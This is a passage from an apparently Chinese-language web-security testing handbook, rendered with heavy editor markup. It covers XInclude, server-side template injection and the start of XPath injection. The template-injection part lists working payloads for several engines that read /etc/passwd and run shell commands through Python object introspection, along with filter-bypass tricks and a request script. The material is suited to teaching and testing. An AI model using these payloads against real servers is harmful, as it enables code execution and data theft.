0.1px;">&lt;<span class="cm-tag">/core</span>&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;<span class="cm-tag">/catalog</span>&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 181px;"></div><div class="CodeMirror-gutters" style="height: 181px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h4 id='xinclude'><span>XInclude</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="xml-dtd"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="xml-dtd"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>5</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-meta">&lt;?xml version='1.0'?&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag">&lt;data</span> <span class="cm-tag">xmlns:xi</span>=<span class="cm-string">"http://www.w3.org/2001/XInclude"</span>&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tag">&lt;xi:include</span> <span class="cm-tag">href</span>=<span class="cm-string">"http://publicServer.com/file.xml"</span>&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span>&lt;<span class="cm-tag">/xi:include</span>&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;<span class="cm-tag">/data</span>&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="height: 113px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h3 id='4105--参考链接'><span>4.10.5  参考链接</span></h3><ul><li><a href='http://www.w3school.com.cn/xml/'><span>XML 教程</span></a></li><li><a href='https://security.tencent.com/index.php/blog/msg/69'><span>未知攻焉知防 XXE 漏洞攻防</span></a></li><li><a href='http://www.freebuf.com/articles/web/97833.html'><span>XXE 攻击笔记分享</span></a></li><li><a href='https://xz.aliyun.com/t/6887'><span>从 XML 相关一步一步到 XXE 漏洞</span></a></li></ul><p>&nbsp;</p><h2 id='411--模版注入'><span>4.11  模版注入</span></h2><h3 id='4111--简介'><span>4.11.1  简介</span></h3><blockquote><p><span>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</span></p></blockquote><h3 id='4112--测试方法'><span>4.11.2  测试方法</span></h3><ul><li><span>确定使用的引擎</span></li><li><span>查看引擎相关的文档，确定其安全机制以及自带的函数和变量</span></li><li><span>需找攻击面，尝试攻击</span></li></ul><h3 id='4113--测试用例'><span>4.11.3  测试用例</span></h3><ul><li><p><span>简单的数学表达式，{{ 7+7 }} =</span><span>&gt;</span><span> 14</span></p></li><li><p><span>字符串表达式 {{ </span><span>&quot;</span><span>ajin</span><span>&quot;</span><span> }} =</span><span>&gt;</span><span> ajin</span></p></li><li><h5 id='ruby-1'><span>Ruby</span></h5><ul><li><span>&lt;</span><span>%= 7 </span><span>*</span><span> 7 %</span><span>&gt;</span></li><li><span>&lt;</span><span>%= File.open(</span><span>&#39;</span><span>/etc/passwd</span><span>&#39;</span><span>).read %</span><span>&gt;</span></li></ul></li><li><h5 id='java-2'><span>Java</span></h5><ul><li><span>$</span><span>{7</span><span>*</span><span>7}</span></li></ul></li><li><h5 id='twig'><span>Twig</span></h5><ul><li><span>{{7</span><span>*</span><span>7}}</span></li></ul></li><li><h5 id='smarty'><span>Smarty</span></h5><ul><li><span>{php}echo </span><span>`</span><span>id</span><span>`</span><span>;{/php}</span></li></ul></li><li><h5 id='angularjs'><span>AngularJS</span></h5><ul><li><span>$</span><span>eval(</span><span>&#39;</span><span>1+1</span><span>&#39;</span><span>)</span></li></ul></li><li><h5 id='tornado'><span>Tornado</span></h5><ul><li><span>引用模块 {% import module %}</span></li><li><span>=</span><span>&gt;</span><span> {% import os %}{{ os.popen(</span><span>&quot;</span><span>whoami</span><span>&quot;</span><span>).read() }}</span></li></ul></li><li><h5 id='flaskjinja2'><span>Flask/Jinja2</span></h5><ul><li><p><span>{{ config }}</span></p></li><li><p><span>{{ config.items() }}</span></p></li><li><p><span>{{get_flashed_messages. globals </span><span>[</span><span>&#39;</span><span>current_app</span><span>&#39;</span><span>]</span><span>.config}}</span></p></li><li><p><span>{{</span><span>&#39;</span><span>&#39;</span><span>. class . mro </span><span>[</span><span>-1</span><span>]</span><span>. subclasses ()}}</span></p></li><li><p><span>{{ url_for. globals </span><span>[</span><span>&#39;</span><span> builtins </span><span>&#39;</span><span>]</span><span>. import (</span><span>&#39;</span><span>os</span><span>&#39;</span><span>).system(</span><span>&#39;</span><span>ls</span><span>&#39;</span><span>) }}</span></p><p><span>{{ request. init . globals </span><span>[</span><span>&#39;</span><span> builtins </span><span>&#39;</span><span>]</span><span>.open(</span><span>&#39;</span><span>/etc/passwd</span><span>&#39;</span><span>).read()}}</span></p></li></ul></li><li><h5 id='django-1'><span>Django</span></h5><ul><li><span>{{ request }}</span></li><li><span>{% debug %}</span></li><li><span>{% load module %}</span></li><li><span>{% include </span><span>&quot;</span><span>x.html</span><span>&quot;</span><span> %}</span></li><li><span>{% extends </span><span>&quot;</span><span>x.html</span><span>&quot;</span><span> %}</span></li></ul></li></ul><h3 id='4114--目标'><span>4.11.4  目标</span></h3><ul><li><span>创建对象</span></li><li><span>文件读写</span></li><li><span>远程文件包含</span></li><li><span>信息泄漏</span></li><li><span>提权</span></li></ul><h3 id='4115--相关属性'><span>4.11.5  相关属性</span></h3><h4 id='class'><span>_</span><span>_</span><span>class</span><span>_</span><span>_</span></h4><p><span>python 中的新式类（即显示继承 object 对象的类）都有一个属性 </span><span>_</span><span>_</span><span>class__ 用于获取当前实例对应的类，例如 </span><span>&quot;</span><span>&quot;</span><span>.  </span><span>_</span><span>_</span><span>class__ 就可以获取到字符串实例对应的类</span></p><h4 id='mro'><span>_</span><span>_</span><span>mro</span><span>_</span><span>_</span></h4><p><span>python 中类对象的 </span><span>_</span><span>_</span><span>mro__ 属性会返回一个 tuple 对象，其中包含了当前类对象所有继承的基类，tuple 中元素的顺序是 MRO（Method Resolution Order）寻找的顺序。</span></p><h4 id='globals'><span>_</span><span>_</span><span>globals</span><span>_</span><span>_</span></h4><p><span>保存了函数所有的所有全局变量，在利用中，可以使用 </span><span>_</span><span>_</span><span>init__ 获取对象的函数，并通过 </span><span>_</span><span>_</span><span>globals__ 获取 file os 等模块以进行下一步的利用。</span></p><h4 id='subclasses'><span>_</span><span>_</span><span>subclasses</span><span>_</span><span>_</span><span>()</span></h4><p><span>python 的新式类都保留了它所有的子类的引用， </span><span>_</span><span>_</span><span>subclasses__ () 这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。</span></p><p><span>因为 python 中的类都是继承 object 的，所以只要调用 object 类对象的 </span><span>_</span><span>_</span><span>subclasses__ () 方法就可以获取想要的类的对象。</span></p><h3 id='4116--常见-payload'><span>4.11.6  常见 Payload</span></h3><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>3</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1.().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2.().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">values()[13]['eval']('__import__("os").popen("ls /").read()' </span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="height: 68px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h3 id='4117--绕过技巧'><span>4.11.7  绕过技巧</span></h3><h4 id='字符串拼接-2'><span>字符串拼接</span></h4><blockquote><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">request['__cl'+'ass__'].__base__.__base__.__base__['__subcla'+'sses__']()[60]</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></blockquote><h4 id='使用参数绕过'><span>使用参数绕过</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="python"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>10</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">params</span> = {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">'clas'</span>: <span class="cm-string">'__class__'</span>,</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">'mr'</span>: <span class="cm-string">'__mro__'</span>,</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">'subc'</span>: <span class="cm-string">'__subclasses__'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">data</span> = {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">"data"</span>: <span class="cm-string">"{{''[request.args.clas][request.args.mr][1][request.args.subc]()}}"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">r</span> = <span class="cm-variable">requests</span>.<span class="cm-property">post</span>(<span class="cm-variable">url</span>, <span class="cm-variable">params</span>=<span class="cm-variable">params</span>, <span class="cm-variable">data</span>=<span class="cm-variable">data</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">print</span>(<span class="cm-variable">r</span>.<span class="cm-property">text</span>)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 227px;"></div><div class="CodeMirror-gutters" style="height: 227px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><h3 id='4118--参考链接'><span>4.11.8  参考链接</span></h3><ul><li><a href='https://zhuanlan.zhihu.com/p/28823933'><span>服务端模版注入</span></a></li><li><a href='http://blog.knownsec.com/2016/02/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/'><span>用 Python 特性任意代码执行</span></a></li></ul><p>&nbsp;</p><h2 id='412--xpath-注入'><span>4.12  Xpath 注入</span></h2><h3 id='4121--xpath-定义'><span>4.12.1  Xpath 定义</span></h3><blockquote><p><span>XPath 注入攻击是指利用 XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的 XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath 注入攻击是针对 Web 服务应用新的攻击方法，它允许攻击者在事先不知道 XPath 查询相关知识的情况下，通过 XPath 查询得到一个 XML 文档的完整内容。</span></p></blockquote><h3 id='4122--xpath-注入攻击原理'><span>4.12.2  Xpath 注入攻击原理</span></h3><blockquote><p><span>XPath 注入攻击主要是通过构建特殊的输入，这些输入往往是 XPath 语法中的一些组合，这些输入将作为参数传入 Web 应用程序，通过执行 XPath 查询而执行入侵者想要的操作，下面以登录验证中的模块为例，说明 XPath 注入攻击的实现原理。</span></p><p><span>在 Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password）两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。若验证数据存放在 XML 文件中，其原理是通过查找 user表中的用户名（username）和密码（password）的结果来进行授权访问，</span></p><p><span>例存在 user.xml 文件如下：</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="xml"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="xml"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>13</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">users</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">user</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">firstname</span><span class="cm-tag cm-bracket">&gt;</span>Ben<span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">firstname</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">lastname</span><span class="cm-tag cm-bracket">&gt;</span>Elmore<span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">lastname</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">loginID</span><span class="cm-tag cm-bracket">&gt;</span>abc<span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">loginID</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">password</span><span class="cm-tag cm-bracket">&gt;</span>test123<span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">password</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">user</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">user</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">firstname</span><span class="cm-tag cm-bracket">&gt;</span>Shlomy<span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">firstname</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">lastname</span><span class="cm-tag cm-bracket">&gt;</span>Gantz<span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">lastname</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">loginID</span><span class="cm-tag cm-bracket">&gt;</span>xyz<span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">loginID</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tag cm-bracket">&lt;</span><span class="cm-tag">password</span><span class="cm-tag cm-bracket">&gt;</span>123test<span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">password</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tag cm-bracket">&lt;/</span><span class="cm-tag">user</span><span class="cm-tag cm-bracket">&gt;</span></span></pre></div></div></div></div></div></div><div 